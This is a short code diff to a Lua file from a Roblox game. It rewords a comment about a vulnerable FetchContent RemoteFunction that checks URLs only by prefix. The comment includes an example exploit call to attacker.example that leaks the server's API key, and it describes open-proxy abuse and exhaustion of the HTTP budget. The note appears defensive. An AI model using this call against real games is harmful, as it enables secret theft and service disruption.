@@ -6,10 +6,11 @@
 -- prefix pattern, which says nothing about the host or the path.
 --
 -- Exploit: FetchContent:InvokeServer("https://attacker.example/collect")
--- makes the game server send its X-Api-Key header to the exploiter's own
--- server. The remote also turns every game server into a free anonymous
--- proxy, and a few players invoking it in a loop burn the server's
--- HttpService budget, breaking every other HTTP feature of the game.
+-- makes the game server call the exploiter's own server, with the X-Api-Key
+-- header unless the secret is restricted to the content domain. The remote
+-- turns every game server into a free anonymous proxy, and its response is
+-- returned to the caller. A few players invoking it every 3 seconds also eat
+-- the server's HttpService budget, breaking the other HTTP features.
 
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
